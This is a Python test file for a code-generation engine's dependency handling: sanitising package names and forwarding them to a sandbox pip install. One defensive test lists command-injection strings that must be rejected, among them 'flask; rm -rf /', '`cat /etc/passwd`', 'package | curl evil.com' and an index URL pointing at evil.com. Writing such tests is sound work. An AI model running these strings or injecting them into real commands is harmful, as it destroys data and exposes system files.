"""Tests for Phase 17 Commit M — engine forwards dependencies to
sandbox.

The user's "build a snake game website" attempt crashed with
``ModuleNotFoundError: No module named 'flask'`` because the
sandbox didn't pip-install the deps the planner / coder declared.
Phase 17 Commit M plumbs them through the spec block + coder
metadata.
"""

from __future__ import annotations

import asyncio
from typing import Any

import pytest

from document_processor.code_intelligence.engine import (
    CodeIntelligenceEngine,
)


def _run(coro):
    return asyncio.run(coro)


# ─── _sanitise_dependencies (allow-list regex + cap) ───────────────


def test_sanitise_keeps_simple_package_names():
    assert CodeIntelligenceEngine._sanitise_dependencies(
        ["flask", "requests", "numpy"],
    ) == ["flask", "requests", "numpy"]


def test_sanitise_keeps_version_specifiers():
    assert CodeIntelligenceEngine._sanitise_dependencies(
        ["flask==3.0.0", "requests>=2.31", "numpy<2.0", "pandas~=2.0"],
    ) == ["flask==3.0.0", "requests>=2.31", "numpy<2.0", "pandas~=2.0"]


def test_sanitise_keeps_extras():
    assert CodeIntelligenceEngine._sanitise_dependencies(
        ["uvicorn[standard]", "celery[redis]"],
    ) == ["uvicorn[standard]", "celery[redis]"]


def test_sanitise_drops_shell_metacharacters():
    """Anything with ; & | $ ` " or whitespace gets rejected."""
    bad = [
        "flask; rm -rf /",
        "$(whoami)",
        "`cat /etc/passwd`",
        "package | curl evil.com",
        "package > /etc/hosts",
        "package && echo pwned",
        "flask requests",   # space → reject
        "--index-url http://evil.com",
    ]
    assert CodeIntelligenceEngine._sanitise_dependencies(bad) == []


def test_sanitise_drops_non_string_entries():
    assert CodeIntelligenceEngine._sanitise_dependencies(
        [None, 42, {"x": 1}, [], "real_pkg"],
    ) == ["real_pkg"]


def test_sanitise_caps_at_max_packages():
    raw = [f"pkg_{i}" for i in range(50)]
    out = CodeIntelligenceEngine._sanitise_dependencies(raw, max_packages=12)
    assert len(out) == 12
    assert out[0] == "pkg_0"
    assert out[-1] == "pkg_11"


def test_sanitise_dedupes():
    out = CodeIntelligenceEngine._sanitise_dependencies(
        ["flask", "flask", "  flask  ", "requests"],
    )
    assert out == ["flask", "requests"]


def test_sanitise_drops_overlong_names():
    long = "a" * 200
    out = CodeIntelligenceEngine._sanitise_dependencies([long, "ok_pkg"])
    assert out == ["ok_pkg"]


def test_sanitise_handles_empty_input():
    assert CodeIntelligenceEngine._sanitise_dependencies([]) == []
    assert CodeIntelligenceEngine._sanitise_dependencies(None) == []


# ─── engine forwards deps to sandbox.execute(install_packages=...) ─


class _FakeResult:
    exit_code = 0
    stdout = "ok"
    stderr = ""
    timed_out = False
    error = None
    duration_ms = 1
    language = "python"
    skipped = False
    success = True

    def to_dict(self):
        return {"exit_code": 0, "stdout": "ok", "stderr": "",
                "skipped": False, "success": True}


class _RecordingSandbox:
    """Minimal sandbox stub that records the install_packages it
    receives so the test can assert engine forwarded them."""

    def __init__(self):
        self.calls: list[dict] = []

    async def execute(self, *, code: str, language: str,
                       install_packages=None, **_kw):
        self.calls.append({
            "code_len": len(code or ""),
            "language": language,
            "install_packages": list(install_packages or []),
        })
        return _FakeResult()


def _make_engine_with_sandbox(sandbox):
    async def _stub_llm(prompt, system, max_tokens):
        return ""

    return CodeIntelligenceEngine(
        prompt="", code_context=None, language="python",
        effort="medium", provider="local",
        llm_call=_stub_llm,
        sandbox=sandbox,
        static_harness=None,
        enable_execution=True,
        enable_static_analysis=False,
        enable_testing=False,
        max_debug_iterations=0,
    )


def test_engine_forwards_spec_dependencies():
    sb = _RecordingSandbox()
    eng = _make_engine_with_sandbox(sb)
    eng.code = "from flask import Flask\napp = Flask(__name__)"
    eng.detected_language = "python"
    eng.plan = {
        "spec": {
            "dependencies": ["flask", "requests"],
        },
    }

    _run(eng._phase_execute())
    assert len(sb.calls) == 1
    assert sb.calls[0]["install_packages"] == ["flask", "requests"]


def test_engine_unions_spec_and_coder_metadata_dependencies():
    sb = _RecordingSandbox()
    eng = _make_engine_with_sandbox(sb)
    eng.code = "x = 1"
    eng.detected_language = "python"
    eng.plan = {"spec": {"dependencies": ["flask"]}}
    eng.coder_metadata = {"dependencies": ["pydantic", "redis"]}

    _run(eng._phase_execute())
    assert sb.calls[0]["install_packages"] == [
        "flask", "pydantic", "redis",
    ]


def test_engine_dedupes_when_spec_and_coder_overlap():
    sb = _RecordingSandbox()
    eng = _make_engine_with_sandbox(sb)
    eng.code = "x = 1"
    eng.detected_language = "python"
    eng.plan = {"spec": {"dependencies": ["flask", "requests"]}}
    eng.coder_metadata = {"dependencies": ["flask", "pydantic"]}

    _run(eng._phase_execute())
    assert sb.calls[0]["install_packages"] == [
        "flask", "requests", "pydantic",
    ]


def test_engine_settings_disable_pip_install(monkeypatch):
    from document_processor.config.settings import settings

    monkeypatch.setattr(
        settings, "code_sandbox_pip_install_enabled", False,
    )
    sb = _RecordingSandbox()
    eng = _make_engine_with_sandbox(sb)
    eng.code = "x = 1"
    eng.detected_language = "python"
    eng.plan = {"spec": {"dependencies": ["flask"]}}
    eng.coder_metadata = {"dependencies": ["redis"]}

    _run(eng._phase_execute())
    assert sb.calls[0]["install_packages"] == []


def test_engine_handles_missing_spec_block():
    sb = _RecordingSandbox()
    eng = _make_engine_with_sandbox(sb)
    eng.code = "x = 1"
    eng.detected_language = "python"
    eng.plan = {}            # no spec block
    eng.coder_metadata = {}  # no deps

    _run(eng._phase_execute())
    assert sb.calls[0]["install_packages"] == []


def test_engine_skips_when_execution_disabled():
    sb = _RecordingSandbox()

    async def _stub_llm(prompt, system, max_tokens):
        return ""

    eng = CodeIntelligenceEngine(
        prompt="", code_context=None, language="python",
        effort="medium", provider="local",
        llm_call=_stub_llm,
        sandbox=sb,
        static_harness=None,
        enable_execution=False,  # ← disabled
        enable_static_analysis=False,
        enable_testing=False,
        max_debug_iterations=0,
    )
    eng.code = "x = 1"
    out = _run(eng._phase_execute())
    assert out.get("skipped") is True
    assert sb.calls == []


# ─── _normalise_spec (Phase 17 Commit M planner spec block) ────────


def test_normalise_spec_empty_input():
    from document_processor.code_intelligence.agents import _normalise_spec

    out = _normalise_spec(None)
    assert out == {
        "invariants": [], "signatures": [], "preconditions": [],
        "postconditions": [], "error_cases": [], "dependencies": [],
    }
    assert _normalise_spec({}) == out
    assert _normalise_spec("not-a-dict") == out


def test_normalise_spec_round_trip():
    from document_processor.code_intelligence.agents import _normalise_spec

    raw = {
        "invariants": ["snake length >= 1", "score >= 0"],
        "signatures": ["class Snake:", "def step(direction)"],
        "preconditions": ["board has even dimensions"],
        "postconditions": ["score increments on food eat"],
        "error_cases": ["raise GameOver on wall hit"],
        "dependencies": ["flask", "pygame==2.5.0"],
    }
    out = _normalise_spec(raw)
    for key, expected in raw.items():
        assert out[key] == expected


def test_normalise_spec_caps_count_and_length():
    from document_processor.code_intelligence.agents import _normalise_spec

    raw = {
        "invariants": [f"inv {i}" for i in range(50)],
        "dependencies": [f"pkg{i}" for i in range(40)],
    }
    out = _normalise_spec(raw)
    assert len(out["invariants"]) == 10  # cap from spec table
    assert len(out["dependencies"]) == 20


def test_normalise_spec_drops_non_strings():
    from document_processor.code_intelligence.agents import _normalise_spec

    out = _normalise_spec({
        "invariants": [None, 42, "real one", {"x": 1}],
    })
    assert out["invariants"] == ["real one"]


def test_engine_emits_install_packages_event():
    sb = _RecordingSandbox()
    eng = _make_engine_with_sandbox(sb)
    events: list[dict] = []
    eng._on_event = (lambda e: _record(events, e))  # noqa: SLF001

    async def _record(buf, ev):
        buf.append(ev)

    # Re-bind because lambda above won't await.
    async def _capture(ev):
        events.append(ev)
    eng._on_event = _capture

    eng.code = "from flask import Flask"
    eng.detected_language = "python"
    eng.plan = {"spec": {"dependencies": ["flask"]}}

    _run(eng._phase_execute())
    install_evt = next(
        (e for e in events if e.get("type") == "execution_install_packages"),
        None,
    )
    assert install_evt is not None
    assert install_evt["packages"] == ["flask"]
